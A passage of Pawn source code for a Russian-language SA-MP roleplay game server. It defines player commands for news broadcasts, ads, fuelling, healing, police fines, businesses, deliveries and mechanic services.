		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488 || IsPlayerInRangeOfPoint(playerid, 8.0,1377.7203,-30.6093,1000.9163) && GetPlayerInterior(playerid) == 46)
		{
		    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /ccall [id]");
		    if(GetPVarInt(params[0],"EfirZvon") == 0) return SendClientMessage(playerid,CGREY,"Игрок не в эфире");
		    DeletePVar(params[0],"EfirZvon");
		    DeletePVar(params[0],"ZvonStuidio");
			static const fmt_string[] = "[R] %s отключил от эфира %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			SendClientMessage(params[0],CREWARD,"Ваш отключили от эфира");
			SetPlayerSpecialAction(params[0], 0);
    		if(IsPlayerAttachedObjectSlotUsed(params[0], 2)) RemovePlayerAttachedObject(params[0], 2);
		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте или около аппаратуры в здании Central News Network");
	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}
CMD:acall(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_NEWS )
	{
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	    if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488 || IsPlayerInRangeOfPoint(playerid, 8.0,1377.7203,-30.6093,1000.9163) && GetPlayerInterior(playerid) == 46)
		{
		    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /acall [id]");
		    if(GetPVarInt(params[0],"ZvonStuidio") == 0) return SendClientMessage(playerid,CGREY,"Игрок не звонит в студию");
		    SetPVarInt(params[0],"EfirZvon",1);
			static const fmt_string[] = "[R] %s принял вызов от %s";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
			format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
			SendFMes(F_NEWS,COLOR_SKLAD,str);
			SendClientMessage(params[0],CREWARD,"Вы в эфире");
		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте или около аппаратуры в здании Central News Network");
	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}
CMD:ads(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pMember] == F_NEWS )
	{
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	    if(PlayerInfo[playerid][pRank] < 2) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 582 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 488 || IsPlayerInRangeOfPoint(playerid, 15.0,-0.3776,-39.1723,1999.6429) && GetPlayerInterior(playerid) == 45)
		{
			new kek = 1;
			query = "";
			static const fmt_string[] = "%i | Объявление от %s\n";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			    if(PlayerInfo[i][pAd] == 1)
			    {
				    if(kek == 30)  break;
					
					format(str, sizeof(str), fmt_string,kek,PlayerInfo[i][pSendername]);
					strcat(query, str);
					ListNick[playerid][kek] = i;
					kek++;
				}
			}
			if(kek == 1) return SendClientMessage(playerid,CGREY,"Нет непроверенных объявлений");
			ShowPlayerDialog(playerid,99,DIALOG_STYLE_LIST,"Объявление",query,"Далее","Отмена");
		}
		else SendClientMessage(playerid, CGREY, "Вы должны находиться в специализированном транспорте или около аппаратуры в здании Central News Network");
	}
	else SendClientMessage(playerid, CGREY, "Вам недоступна данная команда");
	return true;
}
CMD:ad(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pPhone] == 0) return SendClientMessage(playerid, CGREY, "Вы не владеете телефоном!");
	if(PlayerInfo[playerid][pAd] > 0) return SendClientMessage(playerid, CGREY, "Вы уже подавали объявление");
	if(sscanf(params, "s[60]", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /ad [текст]");
	if(strlen(params[0]) <= 0 || strlen(params[0] ) > 60) return SendClientMessage(playerid, CGREY, "Длинна объявления от 1 до 60 символов");
	if(PlayerInfo[playerid][pCash] < strlen(params[0])*AdCena) return SendClientMessage(playerid, CGREY, "Недостаточно средств");
	if(GetPVarInt(playerid,"AntiFlood222") > gettime()) return SendClientMessage(playerid, CGREY, "Посылать объявление можно раз в 10 минут!");
	PlayerInfo[playerid][pAd] = 1;
	strmid(PlayerInfo[playerid][pAdText], params[0], 0, strlen(params[0]), 60);
	SetPVarInt(playerid,"AntiFlood222",gettime() + 120);
	static const fmt_string[] = "[R] %s прислал(а) новое объявление";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4];
	format(str, sizeof(str),fmt_string, PlayerInfo[playerid][pSendername]);
	SendFMes(F_NEWS,COLOR_SKLAD,str);
	SendClientMessage(playerid,CREWARD,"Вы подали объявление, ожидайте его проверки");
	return true;

}
CMD:fillcar(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не за рулем");
	if(PlayerInfo[playerid][pKan] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет канистры");
	PlayerInfo[playerid][pKan] = 0;
	Fuel[GetPlayerVehicleID(playerid)] = 30;
	InvMinus(playerid,322,1);
	SendClientMessage(playerid,CREWARD,"Вы заправили транспорт");
	return true;
}
CMD:fuel(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не за рулем");
    if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /fuel [литры]");
    if(params[0] < 1 || params[0] > 200) return SendClientMessage(playerid, CGREY, "Введите: /fuel [литры]");
	new kek = 0;
	static const fmt_string[] = "{FFFFFF}Вы действительно хотите заправить транспорт %i литрами?\nЦена: $%i";
	new str[sizeof(fmt_string)+5+5];
	for(new i = 1; i <=TOTALBIZ; i++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 5.0, BizInfo[i][bXX],BizInfo[i][bYY],BizInfo[i][bZZ]) && BizInfo[i][bType] == 10)
	    {
			if(BizInfo[i][bProd] < params[0]*1) return SendClientMessage(playerid,CGREY,"Недостаточно топлива на заправке");
			if(Fuel[GetPlayerVehicleID(playerid)]+params[0] > 200) return SendClientMessage(playerid,CGREY,"При заправке данным количеством топлива бак будет переполнен");
			if(PlayerInfo[playerid][pCash] < GetCena(i,params[0]*ProdInfo[i][prodCena][0])) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
  			
			format(str, sizeof(str), fmt_string,params[0],GetCena(i,params[0]*ProdInfo[i][prodCena][0]));
			ShowPlayerDialog(playerid,96,DIALOG_STYLE_MSGBOX,"Заправка",str,"Да","Нет");
			SetPVarInt(playerid,"PBIZ",i);
			SetPVarInt(playerid,"ZapLit",params[0]);
	        kek++;
	    }
	}
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не около заправки");
	return true;
}

CMD:mask(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(PlayerInfo[playerid][pMask] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет маски");
    switch(GetPVarInt(playerid,"Mask"))
    {
        case 0:
        {
            SetPVarInt(playerid,"Mask",1);
            ApplyAnimation(playerid,"SHOP","ROB_Shifty",4.0,0,0,0,0,0,1);
           	static const fmt_string[] = "%s достал маску и одевает её";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			SetPlayerColor(playerid, 0x7a766700);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
		//	SetAttachToSkinGlass(playerid,19036,5);
			SetPlayerChatBubble(playerid, "достал маску и одевает её", COLOR_PURPLE, 30.0, 7000);
        }
		case 1:
		{
		    DeletePVar(playerid,"Mask");
           	static const fmt_string[] = "%s снимает маску";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "снимает маску", COLOR_PURPLE, 30.0, 7000);
			if(!IsAGang(playerid) && !IsAMafia(playerid) && PlayerInfo[playerid][pWork] == 0) SetPlayerColor(playerid, 0xFFFFFF20);
			else SetColor(playerid);
		}
	}
	return true;
}
CMD:healme(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pApt] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет аптечек");
	if(PlayerInfo[playerid][pNHeal]) return SendClientMessage(playerid,CGREY,"Нельзя использовать в больнице!");
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(floatround(health) >= 100) return SendClientMessage(playerid, CGREY,"Вы здоровы");
	PlayerInfo[playerid][pApt]--;
	InvMinus(playerid,320,1);
	SetHealth(playerid,100);
	static const fmt_string[] = "%s достает аптечку и использует её";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "достает аптечку и использует её", COLOR_PURPLE, 30.0, 7000);
	SetPVarInt(playerid,"AntiSbiv",1);
	SetPVarInt(playerid,"Sbiv",gettime() + 4);
	SetPlayerAttachedObject(playerid, 1, 11736, 5, 0.117999, 0.089000, 0.000000, -9.800007, 82.600013, 0.699996, 0.574999, 0.44, 0.560999);
	ApplyAnimation(playerid,"ped","gum_eat",4.0,0,0,0,0,0,1);
	SetTimerEx("DelAp",4000,false,"d",playerid);
	return true;
}
forward DelAp(playerid);
public DelAp(playerid)
{
    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	return 1;
}
CMD:eject(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, CGREY, "Вы не в машине");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, CGREY, "Вы должны находиться за рулем транспорт");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /eject [id игрока]");
	if(playerid == params[0]) return SendClientMessage(playerid, CGREY, "Ты не можешь выкинуть себя");
	if(!IsPlayerInVehicle(params[0],GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, CGREY, "Игрок должен находиться в вашем транспорте");
	if(GetPVarInt(params[0],"AFK_Time") > 1) return SendClientMessage(playerid,CGREY,"Нельзя выталкнуть игрока в АФК");
	static const fmt_string[] = "%s выталкивает из транспорта %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
	SetPlayerChatBubble(playerid, "выталкивает из транспорта", COLOR_PURPLE, 30.0, 7000);
	SetVehicleVelocity(GetPlayerVehicleID(params[0]), 0.0, 0.0, 0.0);
	RemovePlayerFromVehicle(params[0]);
	return true;
}
CMD:ticket(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
		if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,CGREY,"Данная команда вам не доступна");
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /ticket [штраф]");
		if(params[0] < 1 || params[0] > 100000) return SendClientMessage(playerid,CGREY,"Укажите сумму больше 1$");
		ShowPlayerDialog(playerid,468,DIALOG_STYLE_LIST,"Штраф","1 | Транспорт\n2 | Игрок","Далее","Отмена");
		SetPVarInt(playerid,"Shtvaf",params[0]);
		
/*		new num[10];
		if(sscanf(params, "is[10]", params[0],num)) return SendClientMessage(playerid, CGREY, "Введите: /ticket [цена] [номер]");
		
		new kek = -1;
		for(new v = 1; v <= TOTALV; v++)
		{
		    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
			if(!strcmp(VInfo[v][vnumber],num,true) && strcmp(VInfo[v][vname],"None",true)) kek = v;
		}
		if(kek == -1) return SendClientMessage(playerid,CGREY,"Транспорта с таким номером не существует");
		VInfo[kek][vtick]+= params[0];
		query = "";
		format(query,sizeof(query),"UPDATE `veh` SET  `tick` = %i WHERE id = '%d' LIMIT 1",VInfo[kek][vnumber]);
		mysql_tquery(mysql,query);
		SendClientMessage(playerid,-1,"Вы выписали штраф машине");
		if(GetPlayerID(VInfo[kek][vname]) != INVALID_PLAYER_ID) SendClientMessage(GetPlayerID(VInfo[kek][vname]),CREWARD,"Внимание! Вашей машине был выписан штраф");*/
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}
function SetStraf(playerid,player[],shtraf)
{
    if(cache_get_row_count(mysql)>0)
    {
        static const fmt_string1[] = "[R] %s | %s выписал штраф %s в размере %d$";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+3+20];
		format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pSendername],player,shtraf);
		SendCopsMessage(str1);
		new sh = cache_get_field_content_int(0, "shtrav", mysql)+shtraf;
		query = "";
	    format(query, sizeof(query), "UPDATE `accounts` SET `shtrav` = '%d' WHERE name = '%d' LIMIT 1",sh,player);
		mysql_tquery(mysql,query);
    }
    else SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
}
CMD:findcar(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
        if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,CGREY,"Данная команда вам не доступна");
        if(sscanf(params, "s[10]", params)) return SendClientMessage(playerid, CGREY, "Введите: /fincar [номер]");
        if(strcmp(params, "None", true) == 0) return SendClientMessage(playerid, CGREY, "На этот номер нельзя выписать штраф");
		new kek = 0;
		for(new v = 1; v <= TOTALV; v++)
		{
		    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
			if(!strcmp(VInfo[v][vnumber],params,true)) kek = VInfo[v][vcar];
		}
		if(kek == 0) return SendClientMessage(playerid,CGREY,"Машина не найдена");
		new Float:x,Float:y,Float:z;
		GetVehiclePos(kek,x,y,z);
  		SetPlayerRaceCheckpoint(playerid,2,x,y,z,0,0,0,10);
    	SetPVarInt(playerid,"GPS",1);
		SendClientMessage(playerid,-1,"Местоположение транспорта показано на карте");
    }
    else SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	return true;
}

new Float:her[3];
CMD:cbiz(playerid, params[])
{
    if(FD1 || FD2)
    {
    	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	    new Float:x5,Float:y5,Float:z5;
		GetPlayerPos(playerid,x5,y5,z5);
		her[0] = x5, her[1] = y5, her[2] = z5;
	}
	return 1;
}
CMD:cbiz1(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(FD1 || FD2)
    {
	    if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	    new raz,cena;
	    if(sscanf(params, "iis[100]",raz,cena,params))
		{
			SendClientMessage(playerid, CGREY, "Введите: /cbiz1 [тип бизнеса] [цена] [название]");
			SendClientMessage(playerid, CGREY, "1 - Ammo | 2 - 24/7 | 3 - Burger");
			SendClientMessage(playerid, CGREY, "4 - Cluckin Bell | 5 - Bar | 8 - Pizza | 11 - одежда | 14 - ресторан " );
			//12 //13
			return 1;
		}
		new Float:XX[3],INT;
		switch(raz)
		{
		    case 1: XX[0] =285.859, XX[1] = -86.7815, XX[2] =1001.52, INT =4;
		    case 2: XX[0] =-27.3143  , XX[1] =-58.2692  , XX[2] =1003.55  , INT = 6;
		    case 3: XX[0] = 362.824 , XX[1] =-75.1218  , XX[2] =1001.51  , INT =10 ;
		    case 4: XX[0] = 365.012 , XX[1] =-11.8445  , XX[2] = 1001.85 , INT =9 ;
			case 5: XX[0] =  501.959  , XX[1] = -67.5631  , XX[2] = 998.758 , INT =11 ;
			case 8: XX[0] =372.378 , XX[1] =-133.525  , XX[2] = 1001.49 , INT =5 ;
			case 9: XX[0] =372.378 , XX[1] =-133.525  , XX[2] = 1001.49 , INT =5 ;
			case 11: XX[0] =227.563 , XX[1] =-8.0968 , XX[2] = 1002.21 , INT =5 ;
			case 14:XX[0] =-794.9106 , XX[1] =489.6564  , XX[2] = 1376.1953 , INT =1 ;
			case 12,13:XX[0] =2214.4631 , XX[1] =-1150.2991  , XX[2] = 1025.7969 , INT =15 ;
		}
		new Float:x5,Float:y5,Float:z5;
		GetPlayerPos(playerid,x5,y5,z5);
		TOTALBIZ++;
		query = "";
		format(query, 512, "INSERT INTO biz (`name`, `xx1`,`yy1`,`zz1`,`price`,`type`,`xx`,`yy`,`zz`,`int`,`x`,`y`,`z`) VALUES ('%s','%f','%f','%f','%d','%d','%f','%f','%f','%d','%f','%f','%f')",params,x5,y5,z5,cena,raz,XX[0],XX[1],XX[2],INT,her[0],her[1],her[2]);
		mysql_tquery(mysql,query);
	}
	return 1;
}
CMD:biz(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPlayerBiz(playerid) || GetPlayerUpr(playerid))
    {
        new i = GetPVarInt(playerid,"PlayerBiz");
        new text[15],tyt[50],kek[100],text33[20];
        switch(BizInfo[i][bLock])
        {
            case 0: text = "Открыт";
            case 1: text = "Закрыт";
            case 2: text = "На ремонте";
        }
     //   switch(BizInfo[i][bUl])
     //   {
     //       case 5: text1 = "Льготная";
      //      default: text1 = "Обычная";
      //  }
        switch(BizInfo[i][bZeml])
        {
            case 0: text33 = "Не оплачен";
            default: format(text33,sizeof(text33),"%s",timec(BizInfo[i][bZeml]));
        }
		switch(BizInfo[i][bUl][1])
		{
		    case 0:
			{
				switch(BizInfo[i][bType])
				{
				    case 9:
					{
					    new kek1= 0;
					    for(new i1 = 1; i1 <= TOTALCJ; i1++) if(CarJob[i1][jbiz] == i && CarJob[i1][jidcar] > 0) kek1++;
						format(tyt,sizeof(tyt),"Занято мест:\t\t\t{f7ae11}%i/10{FFFFFF}\n",kek1);
					}
					case 12,13: tyt = "";
				    default: format(tyt,sizeof(tyt),"Склад продуктов:\t\t{f7ae11}%i/3000{FFFFFF}\n",BizInfo[i][bProd]);
				}
			}
			default:
			{
				switch(BizInfo[i][bType])
				{
				    case 9:
					{
					    new kek1 = 0;
					    for(new i1 = 1; i1 <= TOTALCJ; i1++) if(CarJob[i1][jbiz] == i && CarJob[i1][jidcar] > 0) kek1++;
						format(tyt,sizeof(tyt),"Занято мест:\t\t\t{f7ae11}%i/15{FFFFFF}\n",kek1);
					}
					case 12,13: tyt = "";
				    default: format(tyt,sizeof(tyt),"Склад продуктов:\t\t{f7ae11}%i/5000{FFFFFF}\n",BizInfo[i][bProd]);
				}
			}
		}
		if(BizInfo[i][bType] != 12 && BizInfo[i][bType] != 13)
		{
			if(strfind(BizInfo[i][bMen],"None",true) != -1) kek = "Управляющий:\t\t{f7ae11}Нет{FFFFFF}\n";
			else format(kek,sizeof(kek),"Управляющий:\t\t{f7ae11}%s{FFFFFF}\n",BizInfo[i][bMen]);
		}
        new string[700];
        new str[250];
        str = "";
        format(str,sizeof(str),"{FFFFFF}Название:\t\t\t{f7ae11}%s{FFFFFF}\nГород:\t\t\t\t{f7ae11}Las Venturas{FFFFFF}\nРайон:\t\t\t\t{f7ae11}%s{FFFFFF}\nСтатус:\t\t\t\t{f7ae11}%s{FFFFFF}\n",BizInfo[i][bName],RaionName(GetRaion(BizInfo[i][bX],BizInfo[i][bY])),text);
		strcat(string,str);
		str = "";
  		format(str,sizeof(str),"%s\nАренда земли:\t\t{f7ae11}40$ в день{FFFFFF}\nБаланс предприятия:\t\t{f7ae11}%i${FFFFFF}\n",tyt,BizInfo[i][bMoney]);
		strcat(string,str);
		str = "";
		format(str,sizeof(str),"{FFFFFF}Аренда оплачена на:\t\t{f7ae11}%s{FFFFFF}\n%s",text33,kek);
		strcat(string,str);
		ShowPlayerDialog(playerid,70,DIALOG_STYLE_MSGBOX,"Управление бизнесом",string,"Изменить","Отмена");
		
    }
    else SendClientMessage(playerid,CGREY,"Вы не владете бизнесом");
    return true;
}
CMD:load(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"Raz") == 0) return SendClientMessage(playerid,CGREY,"Вы не работаете развозчиком продуктов");
    if(!IsPlayerInRangeOfPoint(playerid,10,1712.2064,719.5007,10.7680))
	{
	    SetPVarInt(playerid,"GPS",1);
	    SetPlayerRaceCheckpoint(playerid, 2,1712.2064,719.5007,10.7680,0,0,0,10);
		return SendClientMessage(playerid,CGREY,"Вы не на складе (Отмечен на карте)");
	}
    if(Product[GetPlayerVehicleID(playerid)] == 1000) return SendClientMessage(playerid,CGREY,"В машине полный багажник");
    if(Prod < 1000) return SendClientMessage(playerid,CGREY,"На складе мало продуктов");
    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 414 ||GetVehicleModel(GetPlayerVehicleID(playerid)) == 456 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 459)
    {
        if(PlayerInfo[playerid][pJob] == 56)
        {
	        new kek = 1000 - Product[GetPlayerVehicleID(playerid)];
	        Product[GetPlayerVehicleID(playerid)] = kek;
	        Prod -= kek;
	        SetMatsInt("prod",Prod);
	        UpdProd();
	        SendClientMessage(playerid,CREWARD,"Вы загрузили продукты в машину");
        }
    }
    else SendClientMessage(playerid,CGREY,"Вы не в машине для развозки продуктов");
    return true;
}
CMD:cancel(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"RazCar") == 0) return SendClientMessage(playerid,CGREY,"Вы не работаете развозчиком машин");
	switch(GetPVarInt(playerid,"CarLvl"))
	{
	    case 1: DisablePlayerRaceCheckpoint(playerid);
	    case 2: DestroyObject(GetPVarInt(playerid,"CarObj")), DeletePVar(playerid,"CarObj");
	}
	DeletePVar(playerid,"CarDost");
	SendClientMessage(playerid,-1,"Вы отказались от заказа");
    return true;
}

CMD:plist(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(GetPVarInt(playerid,"Raz") == 0) return SendClientMessage(playerid,CGREY,"Вы не в транспорте развозчика продуктов");
    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 414 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 456 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 459) return SendClientMessage(playerid,CGREY,"Вы не работаете развозчиком продуктов");
	new kek = 0;
	query = "";
	strcat(query, "{FFFFFF}");
	static const fmt_string[] = "%i | %s | Заказ: %i продуктов\n";
	new str[sizeof(fmt_string)+32+4];
    for(new i = 1; i<=TOTALBIZ; i++)
    {
        if(!BizInfo[i][bZakaz]) continue;
		format(str, sizeof(str), fmt_string,kek+1,BizInfo[i][bName],BizInfo[i][bZakaz]);
		strcat(query, str);
		ListNick[playerid][kek] = i;
		kek++;
    }
    if(kek == 0) return SendClientMessage(playerid,CGREY,"Заказов нет");
    ShowPlayerDialog(playerid,74,DIALOG_STYLE_LIST,"Заказы",query,"Далее","Отмена");
    return true;
}
CMD:id(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /id [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(GetPVarInt(params[0],"AFK_Time") > 1)
	{
		static const fmt_str[] = "Игрок: %s[%d] - AFK %i сек.";
		new string[sizeof(fmt_str)+MAX_PLAYER_NAME+4+6];
		format(string, sizeof(string), fmt_str, PlayerInfo[params[0]][pSendername],params[0],GetPVarInt(params[0],"AFK_Time"));
		SendClientMessage(playerid,CWHITE,string);
	}
	else
	{
		static const fmt_str[] = "Игрок: %s[%d]";
		new string[sizeof(fmt_str)+MAX_PLAYER_NAME+4];
		format(string, sizeof(string), fmt_str, PlayerInfo[params[0]][pSendername],params[0]);
		SendClientMessage(playerid,CWHITE,string);
	}
	return true;
}
CMD:repair(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"Meh") != 1) return SendClientMessage(playerid,CGREY,"Вы не работаете механиком");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /repair [id игрока]");
	if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете преложить сами себе");
	new Float:x,Float:y,Float:z;
	new Float:CarPos[3];
	GetPlayerPos(playerid,x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid, 7.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid,CGREY,"Игрок должен быть на водительском сидении");
	GetCoordBonnetVehicle(GetPlayerVehicleID(params[0]),CarPos[0],CarPos[1],CarPos[2]);
	if(!IsPlayerInRangeOfPoint(playerid,5.0,CarPos[0],CarPos[1],CarPos[2])) return SendClientMessage(playerid,CGREY,"Вы не рядом с каптом");
	if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	new Float:health;
	GetVehicleHealth(GetPlayerVehicleID(params[0]),health);
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку присоеденится ремонт двигателя");
	static const fmt_string1[] = "%s предложил Вам ремонт вашего транспорта. Цена: $%i";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],250);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"RepID",playerid);
	SetPVarInt(params[0],"Rep",1);
	SetPVarInt(params[0],"RepCena",250);
	return true;
}
CMD:tow(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(GetPVarInt(playerid,"Meh") != 1) return SendClientMessage(playerid,CGREY,"Вы не работаете механиком");
 	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 525 && PlayerInfo[playerid][pJob] == 56)
	{
	    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /tow [id игрока]");
		new Float:CarPos[3];
		if(GetPlayerVehicleID(playerid) == GetPlayerVehicleID(params[0])) return true;
		if(GetPlayerState(params[0]) != 3) return SendClientMessage(playerid,CGREY,"Игрок должен быть на пассажирском сидении своего авто");
		new kek = 0;
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			if(GetPlayerVehicleID(i) == GetPlayerState(params[0]) && GetPlayerState(i) == 2) kek ++;
		}
		if(kek > 0) return SendClientMessage(playerid,CGREY,"За рулём транспорта никого не должно быть");
		GetCoordBonnetVehicle(GetPlayerVehicleID(params[0]),CarPos[0],CarPos[1],CarPos[2]);
		if(!IsPlayerInRangeOfPoint(playerid,7.0,CarPos[0],CarPos[1],CarPos[2])) return SendClientMessage(playerid,CGREY,"Вы не рядом с капотом");
		if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
		SendClientMessage(playerid,CREWARD,"Вы предложили игроку буксировку");
 		static const fmt_string1[] = "%s предложил Вам буксировку вашего транспорта";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		SendClientMessage(params[0],0xFF7F50FF,str1);
		SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		SetPVarInt(params[0],"BuksID",playerid);
		SetPVarInt(params[0],"Buks",1);
	}
	else SendClientMessage(playerid,CGREY,"Вы не за рулём машины механиков");
	return true;
}
CMD:pay(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Передача денег доступна с 2 уровня");
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /pay [id игрока] [сумма]");
